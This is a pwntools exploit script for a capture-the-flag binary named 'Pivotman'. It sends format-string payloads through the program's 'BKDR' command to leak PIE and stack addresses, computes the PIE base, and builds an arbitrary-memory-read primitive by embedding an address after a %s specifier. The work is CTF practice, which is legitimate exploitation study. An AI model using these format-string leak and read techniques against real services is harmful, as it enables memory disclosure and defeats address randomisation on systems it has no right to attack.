#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)

p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Test 1: simple second BKDR to confirm loop works
p.sendline(b'BKDR hello')
resp = p.recvuntil(b' \r\n')
log.info(f'Test 1 (hello): {resp}')

# Test 2: BKDR with just a format spec that doesn't need address
p.sendline(b'BKDR %p')
resp = p.recvuntil(b' \r\n')
log.info(f'Test 2 (%p): {resp}')

# Test 3: BKDR %s with potential crash - try first few positions
for pos in [1030, 1031, 1032]:
    # This reads a string from those positions (which contain buffer content)
    # At pos 1030: "%d BKDR " as a pointer - will likely crash (not a valid addr)
    # So skip that
    pass

# Test: try to read from a known valid address by embedding it
# First, we know the saved_rbp is a stack address
# Let's embed it and read with %s
leak_resp = p.recvuntil(b' \r\n', timeout=3)
# Actually let me parse the saved_rbp from a fresh leak
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_leak = int(parts[0], 16)
stack_leak = int(parts[1], 16)
pie_base = pie_leak - 0x3a10
saved_rbp = stack_leak

log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Test: read from saved_rbp address (should contain main's saved rbp)
# This demonstrates arbitrary read works
addr = saved_rbp
payload = b'BKDR %1032$sA' + p64(addr)
log.info(f'Trying to read from {hex(addr)}')
p.sendline(payload)
try:
    resp = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'Read saved_rbp content: {resp}')
except:
    log.error('Program crashed')

p.close()
